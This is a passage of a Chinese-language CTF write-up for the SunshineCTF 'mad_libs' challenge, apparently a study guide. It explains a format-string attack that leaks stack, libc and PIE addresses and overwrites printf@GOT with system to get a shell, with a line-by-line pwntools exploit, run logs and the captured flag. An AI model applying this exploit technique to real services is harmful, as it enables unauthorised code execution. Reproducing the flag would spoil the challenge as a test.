實際 bytes： 40 87 05 83 66 7f | 00 00
             └── 我們要寫的 6 bytes ──┘ └ 永遠是 0 ┘
\end{Verbatim}
\item
  而 GOT 那一格本來存的是「真 \texttt{printf} 的位址」（同樣是
  \texttt{0x00007f…}）， \textbf{它的第 7、8 byte 也已經都是
  \texttt{\textbackslash{}\allowbreak{}x00}} → 所以那 2 bytes \textbf{根本不需要改}。
\end{itemize}

⇒ 寫 6 bytes 就等於寫完整的 8 bytes（GOT
那格本來就是對的），而且\textbf{payload 更短}：

實測同一個目標、同一個值，只差在寫 6 或 8 bytes：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{system, got }\OperatorTok{=} \BaseNTok{0x00007f6683058740}\NormalTok{, }\BaseNTok{0x404010}
\NormalTok{fmtstr\_payload(}\DecValTok{8}\NormalTok{, \{got: p64(system)[:}\DecValTok{6}\NormalTok{]\}, write\_size}\OperatorTok{=}\StringTok{\textquotesingle{}byte\textquotesingle{}}\NormalTok{, write\_size\_max}\OperatorTok{=}\StringTok{\textquotesingle{}byte\textquotesingle{}}\NormalTok{,}
\NormalTok{               numbwritten}\OperatorTok{=}\DecValTok{0}\NormalTok{, badbytes}\OperatorTok{=}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)   }\CommentTok{\# → len = 112}
\NormalTok{fmtstr\_payload(}\DecValTok{8}\NormalTok{, \{got: p64(system)     \}, write\_size}\OperatorTok{=}\StringTok{\textquotesingle{}byte\textquotesingle{}}\NormalTok{, write\_size\_max}\OperatorTok{=}\StringTok{\textquotesingle{}byte\textquotesingle{}}\NormalTok{,}
\NormalTok{               numbwritten}\OperatorTok{=}\DecValTok{0}\NormalTok{, badbytes}\OperatorTok{=}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)   }\CommentTok{\# → len = 144（多 2 個 \%hhn + 2 個位址槽）}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  強制每個 byte 一個 \texttt{\%\allowbreak{}hhn} 時，\textbf{6 bytes = 112 bytes、8
  bytes = 144 bytes}（差 32）；
\item
  用預設的
  \texttt{write\_\allowbreak{}size\_\allowbreak{}max=\textquotesingle{}\allowbreak{}long\textquotesingle{}\allowbreak{}}
  時兩者剛好都是 96 bytes（pwntools 會聰明地用一次 \texttt{\%\allowbreak{}15\$\allowbreak{}lln} 把
  8 bytes 一次寫掉）------ 所以「寫 8 個 byte 也能通，只是通常沒必要」。
\end{itemize}

\textbf{實務上大家選 6 bytes 的理由}就是前者：\texttt{mad\_\allowbreak{}libs} 用
\texttt{fgets(buf,\allowbreak{}\ \allowbreak{}255,\allowbreak{}\ \allowbreak{}...)} 收輸入， \textbf{payload
越短越安全}（§3.4 的長度討論、§9 的坑）。少寫 2 個「永遠是 0」的 byte
就少 2 個寫入與 2 個位址槽，能省下約 32 bytes 的空間。

\begin{quote}
註：這是「\textbf{4-level paging（48-bit VA）}」的常態。若機器開了
\textbf{5-level paging（LA57）}， 使用者位址可能超過
\texttt{2\^\allowbreak{}{}\allowbreak{}48}，那時就\textbf{不能}只寫 6 bytes（要用 7～8 bytes）。
\textbf{判斷方法很簡單：看你洩漏到的位址長什麼樣} ------ 把洩漏值用
\texttt{hex()} 印出來， 如果它 ≤ \texttt{0x7fffffffffff}（＝最高 2 bytes
是 \texttt{00\ \allowbreak{}00}），寫 6 bytes 就是安全的。 本系列 7
題都是（實測最高映射 \texttt{0x7ffc03846000}）。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6. 攻擊計畫}\label{ux653bux64caux8a08ux756b}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
第 1 次迴圈（i=0）: %41$p|%42$p|%43$p|%47$p
     ↓  算出 libc_base、pie_base、system、printf@GOT(絕對位址)

第 2 次迴圈（i=1）: 一組 %n 家族指令（常見是 5~6 個 %hhn，也可能被合併成 %hn/%n）
                    把 printf@GOT 改成 system
     ↓  注意：這次的 printf(buf) 本身還在 libc 的 printf 裡跑，改 GOT 不影響它；
        但要等下一次「呼叫 printf@plt」才會生效

第 3 次迴圈（i=2）: 
     printf("(%d) > ", 3)  →  變成  system("(%d) > ")
                                 ↑ 只會在 stderr 印一行 sh 語法錯誤，無害
     fgets(buf,0x100,stdin) →  讀到我們送的 "/bin/sh"
     printf(buf)           →  變成  system("/bin/sh")   ✶GETSHELL✶
\end{Verbatim}

為什麼這樣可行？

\begin{itemize}
\tightlist
\item
  \texttt{system(cmd)} 會 \texttt{fork} 一個 \texttt{/\allowbreak{}bin/\allowbreak{}sh\ \allowbreak{}-\allowbreak{}c\ \allowbreak{}cmd}
  子行程，\textbf{繼承同一組 stdin/stdout/stderr}（也就是我們的
  socket），所以 shell 直接對我們說話。
\item
  \texttt{system("(\%\allowbreak{}d)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}")} 產生的
  \texttt{sh:\allowbreak{}\ \allowbreak{}-\allowbreak{}c:\allowbreak{}\ \allowbreak{}line\ \allowbreak{}1:\allowbreak{}\ \allowbreak{}syntax\ \allowbreak{}error} 訊息走
  \textbf{stderr}，完全無害，而且\textbf{證明 GOT 真的被改了}。
\item
  第 2 次迴圈的 printf 呼叫時，GOT 已被改；但 CPU 早就在 \texttt{printf}
  裡面了，接下來只會呼叫 libc \textbf{內部}的函式（direct call，不經
  PLT），所以不會自己爆炸。
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{7. \texttt{exploit.\allowbreak{}py}
逐行解說}{7. exploit.py 逐行解說}}\label{exploit.py-ux9010ux884cux89e3ux8aaa}

\begin{quote}
\textbf{以下為了閱讀方便做了精簡}：省略了
\texttt{try/\allowbreak{}except}、\texttt{log.\allowbreak{}xxx()} 訊息、以及常數宣告的細節，
完整內容請直接看 \texttt{exploit.\allowbreak{}py}。實務上解析 leak \textbf{一定}要包
\texttt{try/\allowbreak{}except} （殘留值有可能是
\texttt{(nil)}，\texttt{int(b"(nil)",\allowbreak{}\ \allowbreak{}16)} 會丟 \texttt{ValueError}，見
§9-6）， 下面那個一行版是「簡化示意」，不要照抄到正式腳本裡。
\texttt{exploit.\allowbreak{}py:\allowbreak{}109-\allowbreak{}127}
才是真版本：\texttt{raw.\allowbreak{}split(b"\textbar{}\allowbreak{}")} 取四個字串 → 各自
\texttt{int(x,\allowbreak{}\ \allowbreak{}16)} → 失敗就重連。
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ sys, time}

\CommentTok{\# !! 重要：pwntools 的 pwnlib.args 會把「看起來像識別字」的命令列參數}
\CommentTok{\#    從 sys.argv 裡刪掉（free\_form=True）。所以 \textasciigrave{}REMOTE\textasciigrave{} 會在 import pwn 後消失，}
\CommentTok{\#    必須在 import 之前先讀。}
\NormalTok{REMOTE\_MODE }\OperatorTok{=} \BuiltInTok{len}\NormalTok{(sys.argv) }\OperatorTok{\textgreater{}} \DecValTok{1} \KeywordTok{and}\NormalTok{ sys.argv[}\DecValTok{1}\NormalTok{].upper() }\OperatorTok{==} \StringTok{"REMOTE"}

\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}

\NormalTok{HOST, PORT }\OperatorTok{=} \StringTok{"chal.sunshinectf.games"}\NormalTok{, }\DecValTok{26001}
\NormalTok{HERE }\OperatorTok{=}\NormalTok{ os.path.dirname(os.path.abspath(}\VariableTok{\_\_file\_\_}\NormalTok{))}

\NormalTok{context.arch }\OperatorTok{=} \StringTok{"amd64"}
\NormalTok{context.log\_level }\OperatorTok{=} \StringTok{"info"}

\NormalTok{elf  }\OperatorTok{=}\NormalTok{ ELF(os.path.join(HERE, }\StringTok{"mad\_libs"}\NormalTok{),  checksec}\OperatorTok{=}\VariableTok{False}\NormalTok{)   }\CommentTok{\# 讀 GOT offset}
\NormalTok{libc }\OperatorTok{=}\NormalTok{ ELF(os.path.join(HERE, }\StringTok{"libc.so.6"}\NormalTok{), checksec}\OperatorTok{=}\VariableTok{False}\NormalTok{)   }\CommentTok{\# 讀 system offset}

\NormalTok{PRINTF\_GOT }\OperatorTok{=}\NormalTok{ elf.got[}\StringTok{"printf"}\NormalTok{]        }\CommentTok{\# 0x4010（不寫死，直接讀 ELF）}
\NormalTok{SYSTEM     }\OperatorTok{=}\NormalTok{ libc.symbols[}\StringTok{"system"}\NormalTok{]   }\CommentTok{\# 0x58740}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意 \texttt{context.\allowbreak{}arch\ \allowbreak{}=\ \allowbreak{}"amd64"} \textbf{一定要在呼叫
\texttt{fmtstr\_\allowbreak{}payload()} / \texttt{p64()} 之前}設好。 沒設的話
pwntools 會用預設的 32-bit 來打包位址，你會看到
\texttt{ValueError:\allowbreak{}\ \allowbreak{}pack():\allowbreak{}\ \allowbreak{}number\ \allowbreak{}does\ \allowbreak{}not\ \allowbreak{}fit\ \allowbreak{}within\ \allowbreak{}word\_\allowbreak{}size}（8
bytes 的位址塞不進 4 bytes）。 同理，\texttt{SigreturnFrame()}
也需要它（見 \texttt{wp/\allowbreak{}00\_\allowbreak{}基礎知識\_\allowbreak{}從零開始.\allowbreak{}md} §11.4）。
\end{quote}

用 \texttt{ELF()} 讀 offset
而不是把數字寫死，是嚴謹的作法：萬一檔案換了，數字會自動跟著對。

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{BUF\_POS }\OperatorTok{=} \DecValTok{8}                    \CommentTok{\# buf[0] 是 printf 的第 8 個參數（實測）}
\NormalTok{P\_CANARY    }\OperatorTok{=}\NormalTok{ BUF\_POS }\OperatorTok{+} \DecValTok{33}     \CommentTok{\# 41  → [rbp{-}0x8]}
\NormalTok{P\_SAVED\_RBP }\OperatorTok{=}\NormalTok{ BUF\_POS }\OperatorTok{+} \DecValTok{34}     \CommentTok{\# 42  → [rbp]}
\NormalTok{P\_RET       }\OperatorTok{=}\NormalTok{ BUF\_POS }\OperatorTok{+} \DecValTok{35}     \CommentTok{\# 43  → [rbp+8]}
\NormalTok{P\_MAIN      }\OperatorTok{=}\NormalTok{ BUF\_POS }\OperatorTok{+} \DecValTok{39}     \CommentTok{\# 47  → PIE+0x11c9}

\NormalTok{RET\_OFF\_IN\_LIBC }\OperatorTok{=} \BaseNTok{0x2a1ca}      \CommentTok{\# \_\_libc\_start\_call\_main 裡 call main 的下一行}
\NormalTok{MAIN\_OFF\_IN\_PIE }\OperatorTok{=} \BaseNTok{0x11c9}       \CommentTok{\# main}
\end{Highlighting}
\end{Shaded}

推導：\texttt{rbp-\allowbreak{}0x8} 距離 \texttt{rbp-\allowbreak{}0x110}（buf{[}0{]}）是
\texttt{0x108} bytes = 33 個 slot → \texttt{8+33\ \allowbreak{}=\ \allowbreak{}41}。
\texttt{rbp+0} → 34 個 slot → 42；\texttt{rbp+8} → 43；\texttt{rbp+0x28}
→ 41 個 slot → 47。

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ start():}
    \ControlFlowTok{if}\NormalTok{ REMOTE\_MODE:}
        \ControlFlowTok{return}\NormalTok{ remote(HOST, PORT)}
    \ControlFlowTok{return}\NormalTok{ process([}\StringTok{"./ld{-}linux{-}x86{-}64.so.2"}\NormalTok{, }\StringTok{"{-}{-}library{-}path"}\NormalTok{, }\StringTok{"."}\NormalTok{, }\StringTok{"./mad\_libs"}\NormalTok{], cwd}\OperatorTok{=}\NormalTok{HERE)}
\end{Highlighting}
\end{Shaded}

本機用題目附的 loader + libc 跑，\textbf{不 patch 檔案}。

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ build\_write\_payload(where, what):}
    \ControlFlowTok{return}\NormalTok{ fmtstr\_payload(}
\NormalTok{        BUF\_POS,                    }\CommentTok{\# 我們控制的第 1 個參數編號}
\NormalTok{        \{where: p64(what)[:}\DecValTok{6}\NormalTok{]\},     }\CommentTok{\# 只寫 6 bytes（48{-}bit 的 libc 位址）}
\NormalTok{        write\_size}\OperatorTok{=}\StringTok{"byte"}\NormalTok{,          }\CommentTok{\# 想以 1 byte 為單位寫}
\NormalTok{        numbwritten}\OperatorTok{=}\DecValTok{0}\NormalTok{,              }\CommentTok{\# 在這之前 printf 還沒印過東西}
\NormalTok{        badbytes}\OperatorTok{=}\StringTok{b"}\CharTok{\textbackslash{}n}\StringTok{"}\NormalTok{,             }\CommentTok{\# 不能在 payload 裡出現 0x0a（fgets 會斷行）}
\NormalTok{    )}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意 \texttt{write\_\allowbreak{}size="byte"} \textbf{不代表}輸出一定是 6 個
\texttt{\%\allowbreak{}hhn}：\texttt{fmtstr\_\allowbreak{}payload} 的 \texttt{write\_\allowbreak{}size\_\allowbreak{}max}
預設是 \texttt{"long"}，它會把相鄰 byte 合併成
\texttt{\%\allowbreak{}hn}/\texttt{\%\allowbreak{}n}。想強制 1 byte 一個 \texttt{\%\allowbreak{}hhn} 要再傳
\texttt{write\_\allowbreak{}size\_\allowbreak{}max="byte"}。 兩者都能打通本題（見 §3.4）。
\end{quote}

\texttt{p64(what){[}:\allowbreak{}6{]}}：\texttt{system} 的位址在 x86-64
使用者空間只用到低 6 bytes（＝48 bits； 高位 2 bytes 恆為
\texttt{\textbackslash{}\allowbreak{}x00\textbackslash{}\allowbreak{}x00}），寫 6 bytes 就夠，第
7、8 byte 本來就是 0，不用動。 （完整推導與「為什麼不能寫 8
bytes」見上面 §5 的「為什麼只寫 6 bytes？」。） \texttt{fmtstr\_\allowbreak{}payload}
會自動：切 byte → 依數值排序 → 算好每個
\texttt{\%\allowbreak{}\textless{}\allowbreak{}width\textgreater{}\allowbreak{}c} → 把位址補到 8-byte 邊界 →
產生正確的 \texttt{\%\allowbreak{}N\$\allowbreak{}hhn} / \texttt{\%\allowbreak{}N\$\allowbreak{}hn} / \texttt{\%\allowbreak{}N\$\allowbreak{}n}
索引（哪一種取決於 \texttt{write\_\allowbreak{}size\_\allowbreak{}max}，見上面 ※注意）。

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ exploit\_once():}
\NormalTok{    io }\OperatorTok{=}\NormalTok{ start()}

    \CommentTok{\# {-}{-}{-}{-} 第 1 次迴圈：leak {-}{-}{-}{-}}
\NormalTok{    io.recvuntil(}\StringTok{b"(1) \textgreater{} "}\NormalTok{)}
\NormalTok{    leak\_fmt }\OperatorTok{=} \StringTok{b"|"}\NormalTok{.join(}\StringTok{b"\%\%\%d$p"} \OperatorTok{\%}\NormalTok{ p }\ControlFlowTok{for}\NormalTok{ p }\KeywordTok{in}\NormalTok{ (P\_CANARY, P\_SAVED\_RBP, P\_RET, P\_MAIN))}
\NormalTok{    io.sendline(leak\_fmt)}
\NormalTok{    chunk }\OperatorTok{=}\NormalTok{ io.recvuntil(}\StringTok{b"(2) \textgreater{} "}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{5}\NormalTok{)}
\NormalTok{    raw }\OperatorTok{=}\NormalTok{ chunk[:}\OperatorTok{{-}}\BuiltInTok{len}\NormalTok{(}\StringTok{b"(2) \textgreater{} "}\NormalTok{)].strip()}
\end{Highlighting}
\end{Shaded}

\texttt{recvuntil(b"(2)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}")} 會把「leak 輸出 +
下一個提示字元」一起收到，所以要把提示字元切掉。 （stdout 是
\texttt{\_\allowbreak{}IONBF} 無緩衝，所以 leak 一定會先到。）

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    canary, saved\_rbp, ret, mainp }\OperatorTok{=}\NormalTok{ (}\BuiltInTok{int}\NormalTok{(x, }\DecValTok{16}\NormalTok{) }\ControlFlowTok{for}\NormalTok{ x }\KeywordTok{in}\NormalTok{ raw.split(}\StringTok{b"|"}\NormalTok{))}

    \ControlFlowTok{if}\NormalTok{ canary }\OperatorTok{\&} \BaseNTok{0xFF} \OperatorTok{!=} \DecValTok{0} \KeywordTok{or}\NormalTok{ ret }\OperatorTok{\&} \BaseNTok{0xFFF} \OperatorTok{!=}\NormalTok{ RET\_OFF\_IN\_LIBC }\OperatorTok{\&} \BaseNTok{0xFFF}\NormalTok{:}
        \ControlFlowTok{return} \VariableTok{None}                     \CommentTok{\# 檢查 leak 合理性，不合理就重連}
\NormalTok{    libc\_base }\OperatorTok{=}\NormalTok{ ret   }\OperatorTok{{-}}\NormalTok{ RET\_OFF\_IN\_LIBC}
\NormalTok{    pie\_base  }\OperatorTok{=}\NormalTok{ mainp }\OperatorTok{{-}}\NormalTok{ MAIN\_OFF\_IN\_PIE}
\end{Highlighting}
\end{Shaded}

\texttt{sanity\ \allowbreak{}check}： * canary 最低位元組一定是 \texttt{0x00}（glibc
故意把最低 byte 設成 NUL，讓 \texttt{strlen}/\texttt{printf("\%\allowbreak{}s")}
這類字串函式不會不小心把 canary 洩漏出去）。 * 返回位址的後 3 個 nibble
一定跟 \texttt{0x2a1ca} 一樣（\texttt{...\allowbreak{}1ca}）。

\begin{Shaded}
\begin{Highlighting}[]
    \ControlFlowTok{if}\NormalTok{ libc\_base }\OperatorTok{\&} \BaseNTok{0xFFF} \KeywordTok{or}\NormalTok{ pie\_base }\OperatorTok{\&} \BaseNTok{0xFFF}\NormalTok{:}
        \ControlFlowTok{return} \VariableTok{None}                     \CommentTok{\# 兩個 base 都必須頁對齊}
\end{Highlighting}
\end{Shaded}

這是\textbf{最有用的檢查}：如果 libc 版本不對、或 offset
抄錯，這裡就會擋下來。

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    system     }\OperatorTok{=}\NormalTok{ libc\_base }\OperatorTok{+}\NormalTok{ SYSTEM}
\NormalTok{    printf\_got }\OperatorTok{=}\NormalTok{ pie\_base  }\OperatorTok{+}\NormalTok{ PRINTF\_GOT}

\NormalTok{    payload }\OperatorTok{=}\NormalTok{ build\_write\_payload(printf\_got, system)}
    \ControlFlowTok{if} \StringTok{b"}\CharTok{\textbackslash{}n}\StringTok{"} \KeywordTok{in}\NormalTok{ payload }\KeywordTok{or} \BuiltInTok{len}\NormalTok{(payload) }\OperatorTok{\textgreater{}} \BaseNTok{0xFF}\NormalTok{:}
        \ControlFlowTok{return} \VariableTok{None}                     \CommentTok{\# 含換行會斷、太長會被 fgets 截斷 → 重連換 ASLR}
\NormalTok{    io.sendline(payload)}
\end{Highlighting}
\end{Shaded}

\texttt{0x0a} 檢查必要：目標位址的隨機位元組有約 2\% 機率含
\texttt{0x0a}，那就會斷行。重連一次 ASLR 就換了，所以 retry 迴圈（最多 5
次）就夠。

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    time.sleep(}\FloatTok{0.5}\NormalTok{)}\OperatorTok{;}\NormalTok{ drain(io, }\FloatTok{0.3}\NormalTok{)}
\NormalTok{    io.sendline(}\StringTok{b"/bin/sh"}\NormalTok{)             }\CommentTok{\# 下一次的 printf(buf) 會變成 system(buf)}
\NormalTok{    time.sleep(}\FloatTok{0.4}\NormalTok{)}\OperatorTok{;}\NormalTok{ drain(io, }\FloatTok{0.3}\NormalTok{)}
\NormalTok{    io.sendline(CMD)                    }\CommentTok{\# cat flag.txt /flag ...; ls {-}la; id; echo DONE}
\NormalTok{    ... 讀到 }\StringTok{"DONE"}\NormalTok{ 為止 ...}
\end{Highlighting}
\end{Shaded}

用 \texttt{sleep\ \allowbreak{}+\ \allowbreak{}drain} 而不是
\texttt{recvuntil(b"(3)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}")}，因為\textbf{第 3
次迴圈的提示字元已經不會以 printf 的形式出現}（它變成
\texttt{system("(\%\allowbreak{}d)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}")} 了）。等提示字元會卡住。
（另外：\texttt{pwnlib} 的 \texttt{recvuntil}
若逾時，它回傳空字串但\textbf{資料還留在內部緩衝區}，後面才會吐出來 →
會讓輸出順序錯亂。所以這裡直接 drain。）

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    m }\OperatorTok{=}\NormalTok{ re.search(}\VerbatimStringTok{rb"sun}\CharTok{\textbackslash{}\{}\PreprocessorTok{[\^{}\}}\CharTok{\textbackslash{}n}\PreprocessorTok{]}\OperatorTok{*}\CharTok{\textbackslash{}\}}\VerbatimStringTok{"}\NormalTok{, out)}
    \ControlFlowTok{if}\NormalTok{ m: }\BuiltInTok{print}\NormalTok{(}\StringTok{"FLAG: }\SpecialCharTok{\%s}\StringTok{"} \OperatorTok{\%}\NormalTok{ m.group(}\DecValTok{0}\NormalTok{).decode())}
\end{Highlighting}
\end{Shaded}

不用 TTY：整個流程只是送幾行字、讀回來，stdin 是 \texttt{/\allowbreak{}dev/\allowbreak{}null}
也照跑。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{8.
實際執行結果}\label{ux5be6ux969bux57f7ux884cux7d50ux679c-1}

\begin{quote}
\textbf{先讀這句}：以下兩段是\textbf{某一次}執行的紀錄。ASLR 每次不同，
所以 \texttt{write\ \allowbreak{}payload} 的\textbf{長度}（96 / 112 /
120\ldots）和\textbf{組成}（幾個 \texttt{\%\allowbreak{}hhn}、會不會出現
\texttt{\%\allowbreak{}hn}/\texttt{\%\allowbreak{}n}）\textbf{也會不同}（見 §3.4）。
唯一不變的是：\texttt{len(payload)\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0xFF}（\texttt{fgets}
上限）、不含 \texttt{\textbackslash{}\allowbreak{}n}、而且 \texttt{printf@GOT}
最後等於 \texttt{system}。 想確認 GOT 真的被改，請用 §5 的
\texttt{/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}mem} 自檢腳本。
\end{quote}

\paragraph{本機（先自己造一個假
flag）}\label{ux672cux6a5fux5148ux81eaux5df1ux9020ux4e00ux500bux5047-flag}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ echo \textquotesingle{}sun\{LOCAL\_DUMMY\_FLAG\}\textquotesingle{} \textgreater{} flag.txt}
\NormalTok{$ python3 exploit.py \textless{} /dev/null}
\NormalTok{[*] starting local process with the bundled loader/libc}
\NormalTok{[+] Starting local process \textquotesingle{}./ld{-}linux{-}x86{-}64.so.2\textquotesingle{}: pid 3499910}
\NormalTok{[*] leak line: 0x...|0x7ffd267ccef0|0x7f9949a2a1ca|0x7f9949d1a1c9}
\NormalTok{[+] canary      = 0x...}
\NormalTok{[+] saved rbp   = 0x7ffd267ccef0}
\NormalTok{[+] libc leak   = 0x7f9949a2a1ca  {-}\textgreater{} libc base = 0x7f9949a00000}
\NormalTok{[+] main leak   = 0x7f9949d1a1c9  {-}\textgreater{} PIE  base = 0x7f9949d19000}
\NormalTok{[+] system      = 0x7f9949a58740}
\NormalTok{[+] printf@GOT  = 0x7f9949d1d010}
\NormalTok{[*] write payload (112 bytes): b\textquotesingle{}\%64c\%16$hhn\%9c\%17$hhn\%54c\%18$hhn\%8c\%19$hhn\%18c\%20$hhn\%12c\%21$hhn...\textquotesingle{}   ← 這次 6 個 \%hhn}
\NormalTok{[*] printf@GOT should now contain system()}
\NormalTok{[*] Stopped process}
\NormalTok{sun\{LOCAL\_DUMMY\_FLAG\}}
\NormalTok{total 2348}
\NormalTok{drwxr{-}xr{-}x  2 kzzz kzzz    4096 Sep 28 00:24 .}
\NormalTok{{-}rw{-}r{-}{-}r{-}{-}  1 kzzz kzzz      22 Sep 28 00:15 flag.txt}
\NormalTok{{-}rwxr{-}xr{-}x  1 kzzz kzzz  236616 Sep 28 00:09 ld{-}linux{-}x86{-}64.so.2}
\NormalTok{{-}rwxr{-}xr{-}x  1 kzzz kzzz 2125328 Sep 28 00:09 libc.so.6}
\NormalTok{{-}rwxr{-}xr{-}x  1 kzzz kzzz   14584 Sep 28 00:09 mad\_libs}
\NormalTok{uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)}
\NormalTok{DONE}

\NormalTok{FLAG: sun\{LOCAL\_DUMMY\_FLAG\}}
\end{Highlighting}
\end{Shaded}

\paragraph{遠端（真 flag）}\label{ux9060ux7aefux771f-flag}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ python3 exploit.py REMOTE \textless{} /dev/null}
\NormalTok{[*] connecting to chal.sunshinectf.games:26001}
\NormalTok{[+] Opening connection to chal.sunshinectf.games on port 26001: Done}
\NormalTok{[*] leak line: 0x159dc03394a54300|0x7fffad6b7710|0x74c6d28001ca|0x5deeff4bb1c9}
\NormalTok{[+] canary      = 0x159dc03394a54300}
\NormalTok{[+] saved rbp   = 0x7fffad6b7710}
\NormalTok{[+] libc leak   = 0x74c6d28001ca  {-}\textgreater{} libc base = 0x74c6d27d6000}
\NormalTok{[+] main leak   = 0x5deeff4bb1c9  {-}\textgreater{} PIE  base = 0x5deeff4ba000}
\NormalTok{[+] system      = 0x74c6d282e740}
\NormalTok{[+] printf@GOT  = 0x5deeff4be010}
\NormalTok{[*] write payload (120 bytes): b\textquotesingle{}\%64c\%17$hhn\%52c\%18$hhn\%14c\%19$hhn\%68c\%20$hhn\%12c\%21$hhn\%21c\%22$hhnaaaaba...\textquotesingle{}   ← 這次也是 6 個 \%hhn}
\NormalTok{[*] printf@GOT should now contain system()}
\NormalTok{[*] Closed connection to chal.sunshinectf.games port 26001}
\NormalTok{sun\{f1ll\_iN\_th3\_g0T\_eNtry\}}
\NormalTok{total 12}
\NormalTok{drwxr{-}xr{-}x 2 root root     4096 Sep 26 00:21 .}
\NormalTok{drwxr{-}xr{-}x 1 root root     4096 Sep 26 00:54 ..}
\NormalTok{{-}rw{-}r{-}{-}{-}{-}{-} 1 root mad\_libs   27 Sep 26 00:13 flag.txt}
\NormalTok{uid=1337(mad\_libs) gid=1337(mad\_libs) groups=1337(mad\_libs)}
\NormalTok{DONE}

\NormalTok{FLAG: sun\{f1ll\_iN\_th3\_g0T\_eNtry\}}
\end{Highlighting}
\end{Shaded}

\begin{quote}
遠端工作目錄裡只有
\texttt{flag.\allowbreak{}txt}（\texttt{-\allowbreak{}rw-\allowbreak{}r-\allowbreak{}\/\allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}\ \allowbreak{}mad\_\allowbreak{}libs:\allowbreak{}mad\_\allowbreak{}libs}），\texttt{/\allowbreak{}flag}、\texttt{/\allowbreak{}home/*/\allowbreak{}flag.\allowbreak{}txt}
都不存在，所以命令裡的 \texttt{2\textgreater{}\allowbreak{}/\allowbreak{}dev/\allowbreak{}null}
剛好把「檔案不存在」的訊息吃掉。
\end{quote}

\textbf{真實 flag：\texttt{sun\{\allowbreak{}f1ll\_\allowbreak{}iN\_\allowbreak{}th3\_\allowbreak{}g0T\_\allowbreak{}eNtry\}\allowbreak{}}}（已寫入
\texttt{FLAG.\allowbreak{}txt}）

可靠性：本機 3/3 成功、遠端 4/4 成功。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{9.
常見坑（踩過才知道痛）}\label{ux5e38ux898bux5751ux8e29ux904eux624dux77e5ux9053ux75db}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{參數編號不要猜。} 這題是 \texttt{\%\allowbreak{}8\$\allowbreak{}p} 不是
  \texttt{\%\allowbreak{}6\$\allowbreak{}p}。\texttt{\%\allowbreak{}6\$\allowbreak{}p}/\texttt{\%\allowbreak{}7\$\allowbreak{}p} 印出來的是
  \texttt{rbp-\allowbreak{}0x120}、\texttt{rbp-\allowbreak{}0x118}
  的\textbf{殘留}（每次執行都可能不同）；\texttt{i} 住在
  \texttt{{[}rbp-\allowbreak{}0x114{]}}，也就是 pos 7 的\textbf{高 4 bytes}，而
  \texttt{printf(buf)} 跑在第一次迴圈時
  \texttt{i\ \allowbreak{}=\ \allowbreak{}0}，所以那個高半部固定是
  0。這些值看起來「很像」某種東西，但都不是你的輸入。
\item
  \textbf{\texttt{\textbackslash{}\allowbreak{}n} 不能出現在 payload 裡。}
  \texttt{fgets} 讀到換行就停。目標位址的位元組是隨機的，約 2\% 機率含
  \texttt{0x0a} → 一定要檢查並重連（重連會換 ASLR）。
\item
  \textbf{\texttt{\textbackslash{}\allowbreak{}x00} 會讓 \texttt{printf}
  提前結束}。所以\textbf{位址一定要放在格式指令的後面}。前面的
  \texttt{\%\allowbreak{}hhn} 全部執行完之後 printf 才撞到
  NUL，所以無害。（若把位址放開頭，\texttt{\textbackslash{}\allowbreak{}x00}
  會讓後面的指令全部失效。）
\item
  \textbf{位址區必須 8-byte 對齊}。\texttt{buf{[}0{]}} 是第 8
  個參數，位址若從 \texttt{buf{[}4{]}} 開始，\texttt{\%\allowbreak{}8\$\allowbreak{}hhn}
  讀到的會是「半個位址 + 半個別的」→ 寫到錯誤的地方（通常直接
  segfault）。用 \texttt{fmtstr\_\allowbreak{}payload} 並檢查產生的 payload
  長度，或自己補 \texttt{aaa}/\texttt{aaaa} 對齊。
\item
  \textbf{要算進 \texttt{\%\allowbreak{}n}
  的值只有「真的被印出來的字元」}。格式指令本身（\texttt{\%\allowbreak{}64c}、\texttt{\%\allowbreak{}17\$\allowbreak{}hhn}、\texttt{\%\allowbreak{}n}）\textbf{不會印出任何東西}，所以不增加計數；\texttt{\%\allowbreak{}64c}
  只貢獻
  64。會增加計數的只有兩種：\texttt{\%\allowbreak{}\textless{}\allowbreak{}寬度\textgreater{}\allowbreak{}c}
  的填充、以及格式字串裡\textbf{不是格式指令}的裸文字（例如對齊用的
